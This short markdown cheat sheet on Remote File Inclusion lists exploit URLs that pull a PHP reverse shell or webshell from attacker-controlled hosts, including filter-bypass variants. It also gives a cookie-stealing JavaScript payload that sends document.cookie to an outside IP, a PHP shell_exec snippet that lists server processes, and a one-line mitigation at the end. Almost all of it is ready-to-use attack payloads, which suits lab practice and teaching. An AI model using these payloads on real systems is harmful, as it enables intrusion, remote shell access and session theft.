# Remote File Inclusion

## Exploit
- ```http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.72.200:9999/php-reverse-shell.php```
- ```index.php?page=http://attackerIP/webshell.php``` 
- ```index.php?page=htthttpp://attackerIP/webshell.php```
- ```?page=hTTp://10.20.14.203/reverse.txt?```
## Payloads
- Steal Cookie with "getcookie.txt"
```HTML
<img id="img" src="">
<script>
document.getElementById("img").src="http://192.123.219.2/?cookie="+document.cookie
</script>
```
- Process list of the target server with "shell.php"
```PHP
<?php
$output=shell_exec(“ps -eaf”);
echo “<pre>”.$output.“</pre>”;
?>
```

## Mitigation
-  Disable ```allow_url_fopen = On``` & ```allow_url_include = On```
